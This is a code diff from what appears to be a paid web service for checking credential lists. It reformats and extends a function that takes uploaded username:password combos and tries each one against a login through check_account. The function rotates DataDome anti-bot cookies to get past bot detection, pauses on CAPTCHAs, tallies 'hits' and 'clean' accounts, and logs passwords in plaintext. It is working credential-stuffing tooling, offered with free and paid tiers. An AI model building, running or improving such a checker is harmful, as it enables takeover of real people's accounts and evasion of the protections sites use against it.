@@ -307,84 +307,138 @@ def check_account(user_id, username, password, date, datadome_cookie, selected_c
 def run_check_task(user_id, file_path, selected_cookie_module_name, use_cookie_set, auto_delete, force_restart):
     with app.app_context():
         try:
-            user = User.query.get(user_id); is_paid_user = user.is_paid and user.key_expiry and user.key_expiry > datetime.utcnow()
+            user = User.query.get(user_id)
+            is_paid_user = user.is_paid and user.key_expiry and user.key_expiry > datetime.utcnow()
             line_limit = None if is_paid_user else 100
+            
             selected_cookie_module = getattr(sys.modules[__name__], selected_cookie_module_name)
             stop_event, captcha_pause_event = stop_events[user_id], captcha_pause_events[user_id]
+            
             progress_file = os.path.join(APP_DATA_DIR, f'progress_state_{user_id}.json')
             if force_restart and os.path.exists(progress_file): os.remove(progress_file)
+            
             start_from_index = 0
             if os.path.exists(progress_file):
                 try:
-                    with open(progress_file, 'r') as f: progress_data = json.load(f)
-                    if progress_data.get('source_file_path') == file_path: start_from_index = progress_data.get('last_processed_index', -1) + 1
+                    with open(progress_file, 'r') as f:
+                        progress_data = json.load(f)
+                        if progress_data.get('source_file_path') == file_path:
+                            start_from_index = progress_data.get('last_processed_index', -1) + 1
                 except (IOError, json.JSONDecodeError): pass
-            stats, date, failed_file = {'successful': 0, 'failed': 0, 'clean': 0, 'not_clean': 0, 'incorrect_pass': 0, 'no_exist': 0, 'captcha_count': 0}, get_datenow(), os.path.join(LOGS_BASE_DIR, f"failed_{user_id}_{date}.txt")
+            
+            stats, date = {'successful': 0, 'failed': 0, 'clean': 0, 'not_clean': 0, 'incorrect_pass': 0, 'no_exist': 0, 'captcha_count': 0}, get_datenow()
+            
             try:
-                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f: accounts = list(OrderedDict.fromkeys(line.strip() for line in f if line.strip()))
-            except Exception as e: log_message(f"Error reading account file: {e}", "text-danger", user_id); with status_lock: check_status[user_id]['running'] = False; return
-            if line_limit and len(accounts) > line_limit: log_message(f"Free tier: Processing first {line_limit} of {len(accounts)} accounts.", 'text-warning', user_id); accounts = accounts[:line_limit]
+                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+                    accounts = list(OrderedDict.fromkeys(line.strip() for line in f if line.strip()))
+            except Exception as e:
+                log_message(f"Error reading account file: {e}", "text-danger", user_id)
+                with status_lock:
+                    if user_id in check_status: check_status[user_id]['running'] = False
+                return
+
+            if line_limit and len(accounts) > line_limit:
+                log_message(f"Free tier: Processing first {line_limit} of {len(accounts)} accounts.", 'text-warning', user_id)
+                accounts = accounts[:line_limit]
+            
             total_accounts, accounts_to_process = len(accounts), accounts[start_from_index:]
-            with status_lock: check_status[user_id]['total'], check_status[user_id]['progress'], check_status[user_id]['stats'] = total_accounts, start_from_index, stats
+            
+            with status_lock:
+                check_status[user_id]['total'], check_status[user_id]['progress'], check_status[user_id]['stats'] = total_accounts, start_from_index, stats
+
             cookie_state = {'pool': [], 'index': -1, 'cooldown': {}}
-            if use_cookie_set: cookie_state['pool'] = [c.get('datadome') for c in cookie_config.COOKIE_POOL if c.get('datadome')]
+            if use_cookie_set:
+                cookie_state['pool'] = [c.get('datadome') for c in cookie_config.COOKIE_POOL if c.get('datadome')]
             if not cookie_state['pool']:
                 log_message("[⚠️] DataDome cookie pool is empty. Fetching new ones...", "text-warning", user_id)
                 cookie_state['pool'] = fetch_new_datadome_pool(5, user_id)
-            if not cookie_state['pool']: log_message("[❌] Failed to get any DataDome cookies. Stopping.", "text-danger", user_id); stop_event.set()
+            if not cookie_state['pool']:
+                log_message("[❌] Failed to get any DataDome cookies. Stopping.", "text-danger", user_id)
+                stop_event.set()
+
             for loop_idx, acc in enumerate(accounts_to_process):
                 original_index = start_from_index + loop_idx
                 if stop_event.is_set(): break
-                with status_lock: check_status[user_id]['progress'], check_status[user_id]['current_account'] = original_index + 1, acc
-                if ':' not in acc: log_message(f"Invalid format: {acc} ➔ Skipping", "text-warning", user_id); continue
-                username, password = acc.split(':', 1); is_captcha_loop = True
+                
+                with status_lock:
+                    check_status[user_id]['progress'], check_status[user_id]['current_account'] = original_index + 1, acc
+                
+                if ':' not in acc:
+                    log_message(f"Invalid format: {acc} ➔ Skipping", "text-warning", user_id)
+                    continue
+                
+                username, password = acc.split(':', 1)
+                is_captcha_loop = True
                 while is_captcha_loop and not stop_event.is_set():
                     current_datadome = None
                     if cookie_state['pool']:
                         for _ in range(len(cookie_state['pool'])):
-                            cookie_state['index'] = (cookie_state['index'] + 1) % len(cookie_state['pool']); potential_cookie = cookie_state['pool'][cookie_state['index']]
-                            if time.time() > cookie_state['cooldown'].get(potential_cookie, 0): current_datadome = potential_cookie; break
+                            cookie_state['index'] = (cookie_state['index'] + 1) % len(cookie_state['pool'])
+                            potential_cookie = cookie_state['pool'][cookie_state['index']]
+                            if time.time() > cookie_state['cooldown'].get(potential_cookie, 0):
+                                current_datadome = potential_cookie
+                                break
+                    
                     if not current_datadome:
                         log_message("[❌] All cookies on cooldown or pool empty. Waiting for user action...", "text-danger", user_id)
                         with status_lock: check_status[user_id]['captcha_detected'] = True
-                        captcha_pause_event.clear(); captcha_pause_event.wait(); with status_lock: check_status[user_id]['captcha_detected'] = False
-                        if stop_event.is_set(): break; continue
+                        captcha_pause_event.clear()
+                        captcha_pause_event.wait()
+                        with status_lock: check_status[user_id]['captcha_detected'] = False
+                        if stop_event.is_set(): break
+                        continue
+
                     log_message(f"[▶] Checking: {username}:{password} with cookie ...{current_datadome[-6:]}", "text-info", user_id)
                     result = check_account(user_id, username, password, date, current_datadome, selected_cookie_module)
+
                     if result == "[CAPTCHA]":
-                        stats['captcha_count'] += 1; log_message(f"[🔴 CAPTCHA] Triggered by cookie ...{current_datadome[-6:]}. Cooldown 5 mins.", "text-danger", user_id)
+                        stats['captcha_count'] += 1
+                        log_message(f"[🔴 CAPTCHA] Triggered by cookie ...{current_datadome[-6:]}. Cooldown 5 mins.", "text-danger", user_id)
                         cookie_state['cooldown'][current_datadome] = time.time() + 300
                         with status_lock: check_status[user_id]['captcha_detected'] = True
-                        captcha_pause_event.clear(); captcha_pause_event.wait(); with status_lock: check_status[user_id]['captcha_detected'] = False
-                        if stop_event.is_set(): break; continue
-                    else: is_captcha_loop = False
+                        captcha_pause_event.clear()
+                        captcha_pause_event.wait()
+                        with status_lock: check_status[user_id]['captcha_detected'] = False
+                        if stop_event.is_set(): break
+                        continue
+                    else:
+                        is_captcha_loop = False
+                
                 if stop_event.is_set(): break
+                
                 if isinstance(result, tuple):
                     console_message, _, _, _, is_clean, file_to_write, content_to_write = result
-                    log_message(console_message, "text-success", user_id); stats['successful'] += 1
+                    log_message(console_message, "text-success", user_id)
+                    stats['successful'] += 1
                     if is_clean: stats['clean'] += 1
                     else: stats['not_clean'] += 1
-                    # Note: Saving files won't work on Render's free tier ephemeral filesystem
-                    # This is kept for local dev. A better solution would be to offer a download link.
-                    # os.makedirs(os.path.dirname(file_to_write), exist_ok=True)
-                    # with open(file_to_write, "a", encoding="utf-8") as f: f.write(content_to_write)
                 elif isinstance(result, str):
                     stats['failed'] += 1
                     if "[🔐]" in result: stats['incorrect_pass'] += 1
                     elif "[😢]" in result: stats['no_exist'] += 1
-                    # with open(failed_file, 'a', encoding='utf-8') as ff: ff.write(f"{acc} - {result}\n")
                     log_message(f"User: {username} | Pass: {password} ➔ {result}", "text-danger", user_id)
-                with status_lock: check_status[user_id]['stats'] = stats.copy()
-                # with open(progress_file, 'w') as pf: json.dump({'source_file_path': file_path, 'last_processed_index': original_index}, pf)
+                
+                with status_lock:
+                    check_status[user_id]['stats'] = stats.copy()
+
             summary = f"--- CHECK COMPLETE --- | Total: {total_accounts} | Hits: {stats['successful']} | Fails: {stats['failed']}"
             log_message(summary, "text-success", user_id)
-            if not stop_event.is_set() and os.path.exists(progress_file): os.remove(progress_file)
-            with status_lock: check_status[user_id]['final_summary'] = summary
+            if not stop_event.is_set() and auto_delete and os.path.exists(file_path):
+                try:
+                    os.remove(file_path)
+                    log_message(f"Source file deleted.", "text-info", user_id)
+                except OSError as e:
+                    log_message(f"Failed to delete source file: {e}", "text-danger", user_id)
+
+            with status_lock:
+                check_status[user_id]['final_summary'] = summary
         except Exception as e:
-            import traceback; log_message(f"CRITICAL ERROR in checker task: {e}\n{traceback.format_exc()}", "text-danger", user_id)
+            import traceback
+            log_message(f"CRITICAL ERROR in checker task: {e}\n{traceback.format_exc()}", "text-danger", user_id)
         finally:
             with status_lock:
-                if user_id in check_status: check_status[user_id]['running'] = False
+                if user_id in check_status:
+                    check_status[user_id]['running'] = False
 # --- [END] COMPLETE CHECKER LOGIC ---
 
 # --- AUTHENTICATION & APP ROUTES ---
